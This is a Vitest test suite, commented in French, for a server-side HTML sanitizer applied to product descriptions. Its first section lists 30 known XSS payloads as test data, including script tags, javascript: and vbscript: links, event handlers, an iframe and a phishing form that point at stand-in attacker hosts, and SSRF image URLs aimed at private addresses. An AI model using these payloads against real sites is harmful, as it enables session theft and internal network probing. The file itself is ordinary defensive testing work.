import { describe, it, expect } from "vitest";
import {
  sanitizeProductDescription,
  convertLegacyHtmlStyles,
  isWhitelistedVideoUrl,
  isPrivateOrLocalIpUrl,
  formatAiStructuredDescription,
} from "./server-html-sanitizer";

describe("Prompt 17-F : Suite de Sécurité & Nettoyage HTML Serveur", () => {
  describe("1. Neutralisation des 30 Charges Utiles XSS Connues (OWASP & Exploits Web)", () => {
    const xssPayloads: { id: number; name: string; payload: string }[] = [
      { id: 1, name: "Script inline classique", payload: "<script>alert('xss')</script>" },
      { id: 2, name: "Script externe", payload: '<script src="https://evil.com/xss.js"></script>' },
      { id: 3, name: "Image avec gestionnaire onerror", payload: "<img src=x onerror=alert(1)>" },
      { id: 4, name: "Image avec protocole javascript:", payload: '<img src="javascript:alert(\'XSS\')">' },
      { id: 5, name: "Lien javascript: direct", payload: '<a href="javascript:alert(1)">Cliquez</a>' },
      { id: 6, name: "Lien javascript: encodé entités HTML", payload: '<a href="jav&#x09;ascript:alert(1)">Lien</a>' },
      { id: 7, name: "Lien protocole vbscript:", payload: '<a href="vbscript:msgbox(1)">Lien</a>' },
      { id: 8, name: "Lien data:text/html exécutable", payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Lien</a>' },
      { id: 9, name: "Élément SVG avec gestionnaire onload", payload: "<svg onload=alert(1)>" },
      { id: 10, name: "SVG imbriqué contenant script", payload: "<svg><script>alert(1)</script></svg>" },
      { id: 11, name: "Body avec gestionnaire onload", payload: "<body onload=alert(1)>" },
      { id: 12, name: "Iframe vers javascript:", payload: '<iframe src="javascript:alert(1)"></iframe>' },
      { id: 13, name: "Iframe pirate non autorisée", payload: '<iframe src="https://attacker.com/steal-token"></iframe>' },
      { id: 14, name: "Style avec url javascript", payload: '<style>body{background:url("javascript:alert(1)")}</style>' },
      { id: 15, name: "Style inline expression d'URL", payload: '<div style="background-image: url(javascript:alert(1))">Test</div>' },
      { id: 16, name: "Style inline behavior HTC", payload: '<div style="behavior: url(xss.htc);">Test</div>' },
      { id: 17, name: "Input image avec onerror", payload: '<input type="image" src=x onerror=alert(1)>' },
      { id: 18, name: "Formulaire de phishing externe", payload: '<form action="https://evil.com/phishing"><input type="password"></form>' },
      { id: 19, name: "Bouton avec gestionnaire onclick", payload: '<button onclick="alert(1)">Acheter</button>' },
      { id: 20, name: "Balise object avec malware SWF", payload: '<object data="https://evil.com/malware.swf"></object>' },
      { id: 21, name: "Balise embed", payload: '<embed src="https://evil.com/xss.swf">' },
      { id: 22, name: "Balise meta refresh vers javascript:", payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">' },
      { id: 23, name: "Balise link vers feuille de style malveillante", payload: '<link rel="stylesheet" href="javascript:alert(1)">' },
      { id: 24, name: "Balise forte avec onmouseover", payload: '<strong onmouseover="alert(\'xss\')">Survol</strong>' },
      { id: 25, name: "Balise marquee avec onstart", payload: '<marquee onstart=alert(1)>Texte</marquee>' },
      { id: 26, name: "Balise MathML contenant un script", payload: "<math><mtext><script>alert(1)</script></mtext></math>" },
      { id: 27, name: "Table avec attribut background javascript", payload: '<table background="javascript:alert(1)"><tr><td>Test</td></tr></table>' },
      { id: 28, name: "Image avec tentative SSRF vers localhost", payload: '<img src="http://127.0.0.1:8000/admin">' },
      { id: 29, name: "Image avec tentative SSRF vers réseau privé 192.168", payload: '<img src="http://192.168.1.1/settings">' },
      { id: 30, name: "Balises de script imbriquées et mal formées", payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>' },
    ];

    xssPayloads.forEach(({ id, name, payload }) => {
      it(`charge #${id} : neutralise formellement "${name}"`, () => {
        const report = sanitizeProductDescription(payload, { productTitle: "Produit Test" });
        const clean = report.cleanedHtml.toLowerCase();

        // Vérifications absolues d'absence d'éléments d'exécution
        expect(clean).not.toContain("<script");
        expect(clean).not.toContain("alert(");
        expect(clean).not.toContain("onerror");
        expect(clean).not.toContain("onload");
        expect(clean).not.toContain("onclick");
        expect(clean).not.toContain("onmouseover");
        expect(clean).not.toContain("onstart");
        expect(clean).not.toContain("javascript:");
        expect(clean).not.toContain("vbscript:");
        expect(clean).not.toContain("<svg");
        expect(clean).not.toContain("<object");
        expect(clean).not.toContain("<embed");
        expect(clean).not.toContain("<form");
        expect(clean).not.toContain("<iframe"); // Sauf YouTube/Vimeo
        expect(clean).not.toContain("127.0.0.1");
        expect(clean).not.toContain("192.168.1.1");

        expect(report.status).toBe("sanitized");
        expect(report.removedSecurityElements.length).toBeGreaterThan(0);
      });
    });
  });

  describe("2. Respect de la hiérarchie SEO et des balises autorisées", () => {
    it("convertit systématiquement <h1> en <h2> pour préserver l'unicité du H1 produit", () => {
      const html = "<h1>Titre Majeur du Produit</h1><p>Description normale</p>";
      const report = sanitizeProductDescription(html);

      expect(report.cleanedHtml).toContain("<h2>Titre Majeur du Produit</h2>");
      expect(report.cleanedHtml).not.toContain("<h1>");
    });

    it("conserve les balises de structure légitimes (h2, h3, h4, p, ul, ol, li, strong, em, table)", () => {
      const html = `
        <h2>Guide d'utilisation</h2>
        <p>Prenez <strong>2 gélules</strong> par jour avec un grand verre d'eau.</p>
        <ul>
          <li>Efficacité garantie</li>
          <li>100% naturel</li>
        </ul>
        <table>
          <thead><tr><th>Ingrédient</th><th>Dosage</th></tr></thead>
          <tbody><tr><td>Zinc</td><td>15 mg</td></tr></tbody>
        </table>
      `;
      const report = sanitizeProductDescription(html);

      expect(report.cleanedHtml).toContain("<h2>Guide d'utilisation</h2>");
      expect(report.cleanedHtml).toContain("<strong>2 gélules</strong>");
      expect(report.cleanedHtml).toContain("<ul>");
      expect(report.cleanedHtml).toContain("<table>");
    });

    it("ajoute target='_blank' et rel='noopener noreferrer nofollow' aux liens externes", () => {
      const html = '<p>Consultez notre <a href="https://example.com/etude">étude clinique</a>.</p>';
      const report = sanitizeProductDescription(html);

      expect(report.cleanedHtml).toContain('href="https://example.com/etude"');
      expect(report.cleanedHtml).toContain('target="_blank"');
      expect(report.cleanedHtml).toContain('rel="noopener noreferrer nofollow"');
    });

    it("ajoute loading='lazy' et un alt de secours aux images valides", () => {
      const html = '<p><img src="https://images.unsplash.com/photo-1556228720-195a672e8a03" /></p>';
      const report = sanitizeProductDescription(html, { productTitle: "Crème Hydratante" });

      expect(report.cleanedHtml).toContain('loading="lazy"');
      expect(report.cleanedHtml).toContain('alt="Crème Hydratante"');
    });

    it("autorise les vidéos YouTube et Vimeo sur liste blanche", () => {
      const ytHtml = '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>';
      const vimeoHtml = '<iframe src="https://player.vimeo.com/video/76979871"></iframe>';

      const ytReport = sanitizeProductDescription(ytHtml);
      const vimeoReport = sanitizeProductDescription(vimeoHtml);

      expect(ytReport.cleanedHtml).toContain("https://www.youtube.com/embed/dQw4w9WgXcQ");
      expect(vimeoReport.cleanedHtml).toContain("https://player.vimeo.com/video/76979871");
    });
  });

  describe("3. Conversion intelligente des anciens styles (Prompt 17-F, 3)", () => {
    it("convertit style='font-weight: bold' en balise <strong>", () => {
      const raw = '<p><span style="font-weight: bold;">Texte important</span></p>';
      const { convertedHtml } = convertLegacyHtmlStyles(raw);

      expect(convertedHtml).toContain("<strong>Texte important</strong>");
    });

    it("convertit style='font-style: italic' en balise <em>", () => {
      const raw = '<p><span style="font-style: italic;">Texte en italique</span></p>';
      const { convertedHtml } = convertLegacyHtmlStyles(raw);

      expect(convertedHtml).toContain("<em>Texte en italique</em>");
    });

    it("convertit style='text-align: center' en bloc centré sûr", () => {
      const raw = '<div style="text-align: center;">Titre centré</div>';
      const { convertedHtml } = convertLegacyHtmlStyles(raw);

      expect(convertedHtml).toContain('data-align="center"');
    });

    it("supprime les paragraphes vides superflus et les espacements parasites", () => {
      const raw = '<p>Paragraphe 1</p><p>&nbsp;</p><p><br></p><p></p><p>Paragraphe 2</p>';
      const { convertedHtml } = convertLegacyHtmlStyles(raw);

      expect(convertedHtml).not.toContain("<p>&nbsp;</p>");
      expect(convertedHtml).toContain("<p>Paragraphe 1</p>");
      expect(convertedHtml).toContain("<p>Paragraphe 2</p>");
    });
  });

  describe("4. Rapport d'Assainissement Honnête (Prompt 17-F, 4)", () => {
    it("renvoie 'clean' pour un texte HTML déjà parfaitement propre", () => {
      const html = "<p>Un produit d'exception fabriqué localement.</p>";
      const report = sanitizeProductDescription(html);

      expect(report.status).toBe("clean");
      expect(report.statusLabel).toBe("Description importée sans changement");
      expect(report.hasChanges).toBe(false);
    });

    it("renvoie 'simplified' si seulement des styles inline ont été convertis", () => {
      const html = '<p><span style="font-weight: bold;">Produit test</span></p>';
      const report = sanitizeProductDescription(html);

      expect(report.status).toBe("simplified");
      expect(report.statusLabel).toBe("Mise en forme simplifiée");
    });

    it("renvoie 'sanitized' dès qu'un script ou élément malveillant est supprimé", () => {
      const html = "<p>Super crème</p><script>evil()</script>";
      const report = sanitizeProductDescription(html);

      expect(report.status).toBe("sanitized");
      expect(report.statusLabel).toBe("Éléments retirés par sécurité");
    });
  });

  describe("5. Amélioration de description avec l'IA (Prompt 17-F, 5)", () => {
    it("génère une structure cohérente avec Accroche, Bénéfices, Mode d'emploi et Précautions", () => {
      const result = formatAiStructuredDescription({
        title: "Sérum Anti-Âge Révolutionnaire",
        category: "Cosmétique",
        rawTextOrHtml: "Sérum bio à la bave d'escargot.",
      });

      expect(result).toContain("<h2>Sérum Anti-Âge Révolutionnaire</h2>");
      expect(result).toContain("<h3>Bénéfices clés</h3>");
      expect(result).toContain("<h3>Mode d'emploi & Conseils d'utilisation</h3>");
      expect(result).toContain("<h3>Précautions d'emploi</h3>");
    });
  });

  describe("6. Détection et Protection SSRF sur les URL d'images", () => {
    it("détecte les adresses IP privées et hôtes locaux", () => {
      expect(isPrivateOrLocalIpUrl("http://localhost:3000/image.jpg")).toBe(true);
      expect(isPrivateOrLocalIpUrl("http://127.0.0.1/logo.png")).toBe(true);
      expect(isPrivateOrLocalIpUrl("http://192.168.0.254/cam.jpg")).toBe(true);
      expect(isPrivateOrLocalIpUrl("http://10.0.0.1/private.png")).toBe(true);
      expect(isPrivateOrLocalIpUrl("http://172.16.5.20/db.png")).toBe(true);
      expect(isPrivateOrLocalIpUrl("http://169.254.169.254/latest/meta-data/")).toBe(true);

      // URL publiques valides
      expect(isPrivateOrLocalIpUrl("https://images.unsplash.com/photo-12345")).toBe(false);
      expect(isPrivateOrLocalIpUrl("https://cdn.shopify.com/s/files/test.png")).toBe(false);
    });
  });
});
